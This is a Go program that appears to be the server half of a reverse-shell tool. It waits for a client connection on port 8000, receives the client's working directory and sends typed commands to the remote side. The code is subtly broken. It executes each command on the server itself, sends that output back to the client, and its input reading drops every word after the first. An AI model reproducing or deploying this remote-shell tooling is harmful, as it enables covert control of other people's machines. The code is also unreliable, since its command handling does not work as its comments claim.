package main

import (
	"net"
	"os"
	"fmt"
	"strings"
	"os/exec"
	"strconv"
)

const (
	SERVER_HOST = "127.0.0.1"
	SERVER_PORT = 8000
	BUFFER_SIZE = 1024 * 128 // 128KB max size of messages, feel free to increase
	SEPARATOR = "<sep>"
)

func main() {
	// create a socket object
	ln, err := net.Listen("tcp", SERVER_HOST+":"+strconv.Itoa(SERVER_PORT))
	if err != nil {
		fmt.Println("Error creating listener:", err)
		return
	}
	defer ln.Close()
	fmt.Println("Listening as", SERVER_HOST+":"+strconv.Itoa(SERVER_PORT), "...")

	// accept any connections attempted
	conn, err := ln.Accept()
	if err != nil {
		fmt.Println("Error accepting connection:", err)
		return
	}
	defer conn.Close()
	fmt.Println("Connected!")

	// receiving the current working directory of the client
	buf := make([]byte, BUFFER_SIZE)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("Error reading from connection:", err)
		return
	}
	cwd := string(buf[:n])
	fmt.Println("[+] Current working directory:", cwd)

	for {
		// get the command from prompt
		var command string
		fmt.Print(cwd + " $> ")
		fmt.Scan(&command)
		if command == "" {
			// empty command
			continue
		}
		// send the command to the client
		_, err = conn.Write([]byte(command))
		if err != nil {
			fmt.Println("Error sending command to client:", err)
			break
		}
		if strings.ToLower(command) == "exit" {
			// if the command is exit, just break out of the loop
			break
		}
		// retrieve command results
		output, err := exec.Command(command).Output()
		if err != nil {
			fmt.Println("Error executing command:", err)
			break
		}
		// get the current working directory as output
		cwd, err = os.Getwd()
		if err != nil {
			fmt.Println("Error getting current working directory:", err)
			break
		}
		// send the results back to the client
		message := string(output) + SEPARATOR + cwd
		_, err = conn.Write([]byte(message))
		if err != nil {
			fmt.Println("Error sending results to client:", err)
			break
		}
	}
}
